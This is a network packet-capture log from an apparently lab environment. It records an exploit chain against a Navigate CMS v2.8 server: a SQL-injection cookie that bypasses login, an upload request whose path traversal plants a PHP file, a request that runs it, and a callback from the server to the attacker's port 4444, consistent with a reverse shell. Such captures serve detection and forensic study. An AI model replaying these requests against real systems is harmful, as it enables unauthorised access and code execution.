Nov 21, 2021 01:22:49.844173000 SE Asia Standard Time;192.168.111.255;192.168.111.1;54915;54915;UDP;305;54915 > 54915 LEN=271
Nov 21, 2021 01:24:34.266262000 SE Asia Standard Time;arp;42;Layer ARP: 	Hardware type: Ethernet (1) 	Protocol type: IPv4 (0x0800) 	Hardware size: 6 	Protocol size: 4 	Opcode: request (1) 	Sender MAC address: 00:50:56:c0:00:08 	Sender IP address: 192.168.111.1 	Target MAC address: 00:00:00:00:00:00 	Target IP address: 192.168.111.2 
Nov 21, 2021 01:24:34.791335000 SE Asia Standard Time;arp;42;Layer ARP: 	Hardware type: Ethernet (1) 	Protocol type: IPv4 (0x0800) 	Hardware size: 6 	Protocol size: 4 	Opcode: request (1) 	Sender MAC address: 00:50:56:c0:00:08 	Sender IP address: 192.168.111.1 	Target MAC address: 00:00:00:00:00:00 	Target IP address: 192.168.111.2 
Nov 21, 2021 01:24:34.845731000 SE Asia Standard Time;192.168.111.255;192.168.111.1;54915;54915;UDP;305;54915 > 54915 LEN=271
Nov 21, 2021 01:24:35.288640000 SE Asia Standard Time;239.255.255.250;192.168.111.1;53990;1900;ssdp;216;"Layer SSDP: 	M-SEARCH * HTTP/1.1\r\n 	Expert Info (Chat/Sequence): M-SEARCH * HTTP/1.1\r\n 	M-SEARCH * HTTP/1.1\r\n 	Severity level: Chat 	Group: Sequence 	Request Method: M-SEARCH 	Request URI: * 	Request Version: HTTP/1.1 	HOST: 239.255.255.250:1900\r\n 	USER-AGENT: Microsoft Edge/95.0.1020.53 Windows\r\n 	Full request URI: http://239.255.255.250:1900* 	HTTP request 1/1 	\r\n 	MAN: ""ssdp:discover""\r\n 	MX: 1\r\n 	ST: urn:dial-multiscreen-org:service:dial:1\r\n "
Nov 21, 2021 01:24:35.378471000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34441;80;tcp;74;34441 > 34441 [SYN] Seq=0 Win=64240 LEN=0
Nov 21, 2021 01:24:35.378747000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;74;34441 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 21, 2021 01:24:35.378986000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34441;80;tcp;66;80 > 34441 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 21, 2021 01:24:35.379523000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34441;80;http;189;Layer HTTP: 	GET /navigate/login.php HTTP/1.1\r\n 	Expert Info (Chat/Sequence): GET /navigate/login.php HTTP/1.1\r\n 	GET /navigate/login.php HTTP/1.1\r\n 	Severity level: Chat 	Group: Sequence 	Request Method: GET 	Request URI: /navigate/login.php 	Request Version: HTTP/1.1 	Host: 192.168.111.136\r\n 	User-Agent: Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1)\r\n 	Full request URI: http://192.168.111.136/navigate/login.php 	HTTP request 1/1 	\r\n 
Nov 21, 2021 01:24:35.379755000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;66;34441 > 80 [ACK] Seq=1 Ack=124 Win=65152 LEN=0
Nov 21, 2021 01:24:35.483963000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;1514;34441 > 80 [ACK] Seq=1 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:24:35.483986000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;1514;34441 > 80 [ACK] Seq=1449 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:24:35.483998000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;1514;34441 > 80 [ACK] Seq=2897 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:24:35.484012000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;1514;34441 > 80 [ACK] Seq=4345 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:24:35.484023000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;1514;34441 > 80 [PUS, ACK] Seq=5793 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:24:35.484146000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;1514;34441 > 80 [ACK] Seq=7241 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:24:35.484167000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;322;34441 > 80 [PUS, ACK] Seq=8689 Ack=124 Win=65152 LEN=256
Nov 21, 2021 01:24:35.484449000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34441;80;tcp;66;80 > 34441 [ACK] Seq=124 Ack=7241 Win=60672 LEN=0
Nov 21, 2021 01:24:35.484528000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34441;80;tcp;66;80 > 34441 [ACK] Seq=124 Ack=8945 Win=59008 LEN=0
Nov 21, 2021 01:24:35.484864000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;data-text-lines;71;"Layer DATA-TEXT-LINES: 	<!DOCTYPE html>\n 	<!--\r\n 	              _   _             _             _          _____ __  __  _____\r\n 	             | \ | |           (_)           | |        / ____|  \/  |/ ____|\r\n 	             |  \| | __ ___   ___  __ _  __ _| |_ ___  | |    | \  / | (___\r\n 	             | . ` |/ _` \ \ / / |/ _` |/ _` | __/ _ \ | |    | |\/| |\___ \\r\n 	             | |\  | (_| |\ V /| | (_| | (_| | ||  __/ | |____| |  | |____) |\r\n 	             |_| \_|\__,_| \_/ |_|\__, |\__,_|\__\___|  \_____|_|  |_|_____/\r\n 	                                   __/ |\r\n 	                                  |___/\r\n 	            -->\n 	<html><head>\n 	<meta http-equiv=""Content-Type"" content=""text/html charset=utf-8"" />\n 	<meta name=""viewport"" content=""width=device-width, user-scalable=no"">\n 	<meta http-equiv=""Expires"" content=""Tue, 01 Jan 1980 1:00:00 GMT"" />\n 	<meta http-equiv=""Pragma"" content=""no-cache"" />\n 	<link rel=""shortcut icon"" type=""image/png"" href=""img/navigate-isotype-16x16.png"">\n 	<title>Navigate CMS</title>\n 	<script language=""javascript"" src=""http://192.168.111.136/navigate/js/jquery.min.js?r=""></script>\n 	<script language=""javascript"" src=""http://192.168.111.136/navigate/js/jquery-migrate.js?r=""></script>\n 	<script language=""javascript"" type=""text/javascript"">jQuery.migrateTrace = false</script>\n 	<script language=""javascript"" src=""http://192.168.111.136/navigate/lib/external/jqgrid/i18n/grid.locale-en.js?r=""></script>\n 	<link rel=""stylesheet"" type=""text/css"" href=""http://192.168.111.136/navigate/css/cupertino/jquery-ui.css?r="" />\n 	<link rel=""stylesheet"" type=""text/css"" href=""cache/styles.1635849659.min.css?r=&_=1635849659"" />\n 	<script language=""javascript"" src=""cache/scripts.1635849660.min.jgz?r=&_=1635849660"" type=""text/javascript"" ></script>\n 	 [truncated]<script language=""javascript"" type=""text/javascript"">if(typeof(navigate_window_resize)==""undefined""){$.ajax({async: false, url: ""http://192.168.111.136/navigate/cache/scripts.js?r=&_=1635849660"", dataType: ""script"", cache: tru 	<link rel=""stylesheet"" type=""text/css"" href=""http://192.168.111.136/navigate/css/skins/cupertino.css?r="" />\n 	<script type=""text/javascript"">$.datepicker.setDefaults( $.datepicker.regional[ ""en"" ] )</script>\n 	<link rel=""stylesheet"" type=""text/css"" href=""http://192.168.111.136/navigate/css/font-awesome/css/font-awesome.min.css?r="" />\n 	</head><body>\r\n 	\r\n 	<div class=""navigate-top""></div>\r\n 	\r\n 	<div id=""navigate-status"" class=""ui-corner-all"">\r\n 	\t<div>\r\n 	        <div style=""float: left"">\r\n 	\r\n 	        </div>\r\n 	        <div style=""float: right"">\r\n 	            Navigate CMS v2.8, &copy 2021        </div>    \r\n 	        <div style="" clear: both ""></div>\r\n 	     </div>\r\n 	</div>\r\n 	\r\n 	<div id=""navigate-login"" class=""ui-corner-all"" style="" border: solid 1px #ddd top: 50% margin-top: -150px position: absolute margin-left: -325px left: 50% padding: 4px width: 700px height: 350px "">\r\n 	    <form\r\n 	    \tname=""navigate-content-form""\r\n 	        action=""/navigate/login.php""\r\n 	    \tmethod=""post"" \r\n 	        enctype=""multipart/form-data""\r\n 	        style="" margin-left: auto margin-right: auto margin-top: 50px height: 350px "">\r\n 	\r\n 	        <div style="" float: left margin-right: 55px margin-left: 20px "">\r\n 	            <img src=""img/navigate-logo-430x200.png"" width=""300"" height=""140""  />\r\n 	            <a href=""http://www.navigatecms.com"" style="" display: block text-decoration: none color: #2E476E text-align:  center "" target=""_blank"">www.navigatecms.com</a>\r\n 	        </div>\r\n 	        <div style="" float: left width: 288px "">\r\n 	            <div class=""navigate-form-row"">\r\n 	                <label style="" padding-top: 6px margin-bottom: 6px font-size: 15px "">User</label>\r\n 	                <br />\r\n 	                <input type=""text"" value="""" size=""32"" name=""login-username"" id=""login-username"" style="" width: 278px font-size: 20px "" />\r\n 	            </div>\r\n 	            <div class=""navigate-form-row"">\r\n 	                <label style="" padding-top: 6px margin-bottom: 6px font-size: 15px "">Password</label>\r\n 	                <br />\r\n 	                <input type=""password"" value="""" size=""32"" name=""login-password"" id=""login-password""  style="" width: 278px font-size: 20px "" />\r\n 	            </div>\r\n 	\r\n 	            <div class=""navigate-form-row"">\r\n 	                <input type=""checkbox"" name=""login-remember"" id=""login-remember"" value=""1"" />\r\n 	                <label onclick=""$('#login-remember').trigger('click')"" style="" margin-left: 3px margin-top: 2px position: absolute "">Remember me</label>\r\n 	            </div>\r\n 	\r\n 	            <div class=""navigate-form-row"" id=""login-button"" style="" margin-top: 48px font-size: 15px "">\r\n 	                <button style="" background: none border: none color: transparent display: block float: left "">Enter</button>\r\n 	                <a href=""#"" style="" color: #2E476E font-size: 10px line-height: 30px float: right text-decoration: none"">Forgot password?</a>\r\n 	            </div>\r\n 	        </div>\r\n 	\r\n 	        \r\n 	    </form>\r\n 	</div>\r\n 	\r\n 	<div id=""navigate-lost-password-dialog"" style="" display: none "">\r\n 	    <form action=""?"" method=""post"">\r\n 	        <div class=""navigate-form-row"">\r\n 	            <label style="" padding-top: 6px margin-bottom: 6px font-size: 11px width: auto "">\r\n 	                Enter your Navigate CMS username or e-mail address            </label>\r\n 	            <br />\r\n 	            <input type=""text"" value="""" size=""32"" name=""forgot-password"" id=""forgot-password""  style="" width: 96% font-size: 17px "" />\r\n 	            <br />\r\n 	            <div id=""forgot-password-problem"" class=""subcomment"" style="" margin-left: 0px color: #f33 "">&nbsp</div>\r\n 	        </div>\r\n 	        <div class=""navigate-form-row"" style="" margin-top: 20px "">\r\n 	            <button style="" background: none border: none color: transparent display: block float: left font-size: 12px "">\r\n 	                Ok            </button>\r\n 	        </div>\r\n 	    </div>\r\n 	</div>\r\n 	\r\n 	</body>\r\n 	\r\n 	<script language=""javascript"" type=""text/javascript"">\r\n 	\r\n 	var NAVIGATE_APP = ""http://192.168.111.136/navigate/navigate.php""\r\n 	\r\n 	$(window).on('load,resize', function()\r\n 	{\r\n 	    $('#navigate-status').css({ 'width': $(document).width() - 18 })\r\n 	})\r\n 	\r\n 	$(document).ready(function()\r\n 	{\r\n 	    $('button').removeAttr('style').css({'font-size': '14px', 'padding-bottom': '4px'}).hide().fadeIn('slow', function()\r\n 	    {\r\n 	        $('.error').parent().fadeIn('slow')\r\n 	    })\r\n 	\r\n 	    $('input[name=""login-username""]').focus()\r\n 	\r\n 	    $('#navigate-lost-password-dialog form').on('submit', function(e)\r\n 	    {\r\n 	        $('#forgot-password-problem').html('&nbsp')\r\n 	        e.stopPropagation()\r\n 	        e.preventDefault()\r\n 	\r\n 	        $.post(\r\n 	            'login.php',\r\n 	            {\r\n 	                'action': 'forgot-password',\r\n 	                'value': $('#forgot-password').val()\r\n 	            },\r\n 	            function(data)\r\n 	            {\r\n 	                if(data=='sent')\r\n 	                {\r\n 	                    //$('#navigate-lost-password-dialog').dialog('close')\r\n 	                    $('#navigate-lost-password-dialog').html('')\r\n 	 [truncated]                    $('#navigate-lost-password-dialog').append('<div style=""text-align: center margin: 16px ""><i class=""fa fa-5x fa-envelope"" style=""color: #BBD6F5""></i><i style=""position: absolute margin-top: 28px margin- 	                    $('#navigate-lost-password-dialog').append('<div style=""text-align: center font-weight: bold padding: 10px "">An e-mail with a confirmation link has been sent to your e-mail account.</div>')\r\n 	                }\r\n 	                else if(data=='not_found')\r\n 	                {\r\n 	                    $('#forgot-password-problem').html(""Couldn&#039t find this username or e-mail address"")\r\n 	                }\r\n 	                else// if(data=='not_sent')\r\n 	                {\r\n 	                    $('#forgot-password-problem').html(""E-mail could not be sent please contact the administrator"")\r\n 	                }\r\n 	            }\r\n 	        )\r\n 	    })\r\n 	\r\n 	    // forgot password button\r\n 	    $('#login-button a').on('click', function()\r\n 	    {\r\n 	        $('#navigate-lost-password-dialog').dialog({\r\n 	            title: ""Forgot password?"",\r\n 	            modal: true,\r\n 	            width: 350,\r\n 	            height: 220\r\n 	        })\r\n 	    })\r\n 	\r\n 	    $.setCookie(""navigate-tinymce-scroll"", '{}')\r\n 	})\r\n 	    \r\n 	</script>\r\n 	\r\n 	</html>\r\n "
Nov 21, 2021 01:24:35.485121000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34441;80;tcp;66;80 > 34441 [ACK] Seq=124 Ack=8950 Win=64128 LEN=0
Nov 21, 2021 01:24:35.487338000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34441;80;tcp;66;80 > 34441 [FIN, ACK] Seq=124 Ack=8950 Win=64128 LEN=0
Nov 21, 2021 01:24:35.487792000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;34441;tcp;66;34441 > 80 [FIN, ACK] Seq=8950 Ack=125 Win=65152 LEN=0
Nov 21, 2021 01:24:35.488092000 SE Asia Standard Time;192.168.111.136;192.168.111.132;34441;80;tcp;66;80 > 34441 [ACK] Seq=125 Ack=8951 Win=64128 LEN=0
Nov 21, 2021 01:24:35.489959000 SE Asia Standard Time;192.168.111.136;192.168.111.132;46019;80;tcp;74;46019 > 46019 [SYN] Seq=0 Win=64240 LEN=0
Nov 21, 2021 01:24:35.490309000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;46019;tcp;74;46019 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 21, 2021 01:24:35.490673000 SE Asia Standard Time;192.168.111.136;192.168.111.132;46019;80;tcp;66;80 > 46019 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 21, 2021 01:24:35.491601000 SE Asia Standard Time;192.168.111.136;192.168.111.132;46019;80;http;297;"Layer HTTP: 	POST /navigate/login.php HTTP/1.1\r\n 	Expert Info (Chat/Sequence): POST /navigate/login.php HTTP/1.1\r\n 	POST /navigate/login.php HTTP/1.1\r\n 	Severity level: Chat 	Group: Sequence 	Request Method: POST 	Request URI: /navigate/login.php 	Request Version: HTTP/1.1 	Host: 192.168.111.136\r\n 	User-Agent: Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1)\r\n 	Cookie: navigate-user=\"" OR TRUE--%20\r\n 	Cookie pair: navigate-user=\"" OR TRUE--%20 	Content-Type: application/x-www-form-urlencoded\r\n 	Content-Length: 0\r\n 	Content length: 0 	Full request URI: http://192.168.111.136/navigate/login.php 	HTTP request 1/1 	\r\n "
Nov 21, 2021 01:24:35.491986000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;46019;tcp;66;46019 > 80 [ACK] Seq=1 Ack=232 Win=65024 LEN=0
Nov 21, 2021 01:24:35.496842000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;46019;http;688;Layer HTTP: 	HTTP/1.1 302 Found\r\n 	Expert Info (Chat/Sequence): HTTP/1.1 302 Found\r\n 	HTTP/1.1 302 Found\r\n 	Severity level: Chat 	Group: Sequence 	Response Version: HTTP/1.1 	Status Code: 302 	Status Code Description: Found 	Response Phrase: Found 	Date: Sat, 20 Nov 2021 18:24:35 GMT\r\n 	Server: Apache/2.4.29 (Ubuntu)\r\n 	Set-Cookie: NVSID_8a0e81e4=39r41gcllbb7163uhqoc21k0g0 path=/\r\n 	Cache-Control: no-store, no-cache, must-revalidate\r\n 	location: navigate.php\r\n 	Content-Length: 0\r\n 	Content length: 0 	Content-Type: text/html charset=utf-8\r\n 	HTTP response 1/1 	Time since request: 0.005241000 seconds 	Request in frame: 30 	Request URI: http://192.168.111.136/navigate/login.php 	\r\n 	Expires: Thu, 19 Nov 1981 08:52:00 GMT\r\n 	Pragma: no-cache\r\n 	Set-Cookie: NVSID_8a0e81e4=39r41gcllbb7163uhqoc21k0g0 expires=Sat, 20-Nov-2021 19:24:35 GMT Max-Age=3600 path=/ domain=192.168.111.136\r\n 	Set-Cookie: PHPSESSID=39r41gcllbb7163uhqoc21k0g0 expires=Sat, 20-Nov-2021 19:24:35 GMT Max-Age=3600 path=/ domain=192.168.111.136\r\n 
Nov 21, 2021 01:24:35.497275000 SE Asia Standard Time;192.168.111.136;192.168.111.132;46019;80;tcp;66;80 > 46019 [ACK] Seq=232 Ack=623 Win=64128 LEN=0
Nov 21, 2021 01:24:35.499390000 SE Asia Standard Time;192.168.111.136;192.168.111.132;46019;80;tcp;66;80 > 46019 [FIN, ACK] Seq=232 Ack=623 Win=64128 LEN=0
Nov 21, 2021 01:24:35.499792000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;46019;tcp;66;46019 > 80 [FIN, ACK] Seq=623 Ack=233 Win=65024 LEN=0
Nov 21, 2021 01:24:35.500059000 SE Asia Standard Time;192.168.111.136;192.168.111.132;46019;80;tcp;66;80 > 46019 [ACK] Seq=233 Ack=624 Win=64128 LEN=0
Nov 21, 2021 01:24:35.505702000 SE Asia Standard Time;192.168.111.136;192.168.111.132;40979;80;tcp;74;40979 > 40979 [SYN] Seq=0 Win=64240 LEN=0
Nov 21, 2021 01:24:35.506032000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;40979;tcp;74;40979 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 21, 2021 01:24:35.506417000 SE Asia Standard Time;192.168.111.136;192.168.111.132;40979;80;tcp;66;80 > 40979 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 21, 2021 01:24:35.507199000 SE Asia Standard Time;192.168.111.136;192.168.111.132;40979;80;tcp;1514;80 > 40979 [ACK] Seq=1 Ack=1 Win=64256 LEN=1448
Nov 21, 2021 01:24:35.507214000 SE Asia Standard Time;192.168.111.136;192.168.111.132;40979;80;media;224;"Layer MIME_MULTIPART: 	Type: multipart/form-data 	First boundary: --_Part_903_2855923545_1715298470\r\n 	Encapsulated multipart part:  (image/jpeg) 	Content-Disposition: form-data name=""file"" filename=""LnAGsV6a1ICsbsx""\r\n 	Content-Type: image/jpeg\r\n\r\n 	Media type: image/jpeg (1116 bytes) 	Last boundary: \r\n--_Part_903_2855923545_1715298470--\r\n "
Nov 21, 2021 01:24:35.507576000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;40979;tcp;66;40979 > 80 [ACK] Seq=1 Ack=1607 Win=63872 LEN=0
Nov 21, 2021 01:24:35.520451000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;40979;tcp;662;40979 > 80 [PUS, ACK] Seq=1 Ack=1607 Win=64128 LEN=596
Nov 21, 2021 01:24:35.520729000 SE Asia Standard Time;192.168.111.136;192.168.111.132;40979;80;tcp;66;80 > 40979 [ACK] Seq=1607 Ack=597 Win=64128 LEN=0
Nov 21, 2021 01:24:35.520992000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;40979;http;71;Layer HTTP: 	HTTP/1.1 200 OK\r\n 	Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n 	HTTP/1.1 200 OK\r\n 	Severity level: Chat 	Group: Sequence 	Response Version: HTTP/1.1 	Status Code: 200 	Status Code Description: OK 	Response Phrase: OK 	Date: Sat, 20 Nov 2021 18:24:35 GMT\r\n 	Server: Apache/2.4.29 (Ubuntu)\r\n 	Set-Cookie: NVSID_8a0e81e4=39r41gcllbb7163uhqoc21k0g0 path=/\r\n 	Cache-Control: no-store, no-cache, must-revalidate\r\n 	Transfer-Encoding: chunked\r\n 	Content-Type: application/json\r\n 	HTTP response 1/1 	Time since request: 0.013778000 seconds 	Request in frame: 41 	Request URI: http://192.168.111.136/navigate/navigate_upload.php?session_id=39r41gcllbb7163uhqoc21k0g0&id=../../../navigate_info.php&engine=picnik 	Chunk size: 0 octets 	File Data: 0 bytes 	\r\n 	HTTP chunked response 	End of chunked encoding 	\r\n 	Expires: Thu, 19 Nov 1981 08:52:00 GMT\r\n 	Pragma: no-cache\r\n 	Set-Cookie: NVSID_8a0e81e4=39r41gcllbb7163uhqoc21k0g0 expires=Sat, 20-Nov-2021 19:24:35 GMT Max-Age=3600 path=/ domain=192.168.111.136\r\n 	Set-Cookie: PHPSESSID=39r41gcllbb7163uhqoc21k0g0 expires=Sat, 20-Nov-2021 19:24:35 GMT Max-Age=3600 path=/ domain=192.168.111.136\r\n 
Nov 21, 2021 01:24:35.521191000 SE Asia Standard Time;192.168.111.136;192.168.111.132;40979;80;tcp;66;80 > 40979 [ACK] Seq=1607 Ack=602 Win=64128 LEN=0
Nov 21, 2021 01:24:35.522215000 SE Asia Standard Time;192.168.111.136;192.168.111.132;40979;80;tcp;66;80 > 40979 [FIN, ACK] Seq=1607 Ack=602 Win=64128 LEN=0
Nov 21, 2021 01:24:35.522592000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;40979;tcp;66;40979 > 80 [FIN, ACK] Seq=602 Ack=1608 Win=64128 LEN=0
Nov 21, 2021 01:24:35.522761000 SE Asia Standard Time;192.168.111.136;192.168.111.132;40979;80;tcp;66;80 > 40979 [ACK] Seq=1608 Ack=603 Win=64128 LEN=0
Nov 21, 2021 01:24:35.526270000 SE Asia Standard Time;192.168.111.136;192.168.111.132;41337;80;tcp;74;41337 > 41337 [SYN] Seq=0 Win=64240 LEN=0
Nov 21, 2021 01:24:35.526535000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;41337;tcp;74;41337 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 21, 2021 01:24:35.526744000 SE Asia Standard Time;192.168.111.136;192.168.111.132;41337;80;tcp;66;80 > 41337 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 21, 2021 01:24:35.527353000 SE Asia Standard Time;192.168.111.136;192.168.111.132;41337;80;http;197;Layer HTTP: 	GET /navigate/navigate_info.php HTTP/1.1\r\n 	Expert Info (Chat/Sequence): GET /navigate/navigate_info.php HTTP/1.1\r\n 	GET /navigate/navigate_info.php HTTP/1.1\r\n 	Severity level: Chat 	Group: Sequence 	Request Method: GET 	Request URI: /navigate/navigate_info.php 	Request Version: HTTP/1.1 	Host: 192.168.111.136\r\n 	User-Agent: Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1)\r\n 	Full request URI: http://192.168.111.136/navigate/navigate_info.php 	HTTP request 1/1 	\r\n 
Nov 21, 2021 01:24:35.527598000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;41337;tcp;66;41337 > 80 [ACK] Seq=1 Ack=132 Win=65152 LEN=0
Nov 21, 2021 01:24:35.528443000 SE Asia Standard Time;192.168.111.132;192.168.111.136;59436;4444;tcp;74;59436 > 59436 [SYN] Seq=0 Win=64240 LEN=0
Nov 21, 2021 01:24:35.528703000 SE Asia Standard Time;192.168.111.136;192.168.111.132;4444;59436;tcp;74;59436 > 4444 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 21, 2021 01:24:35.528992000 SE Asia Standard Time;192.168.111.132;192.168.111.136;59436;4444;tcp;66;4444 > 59436 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
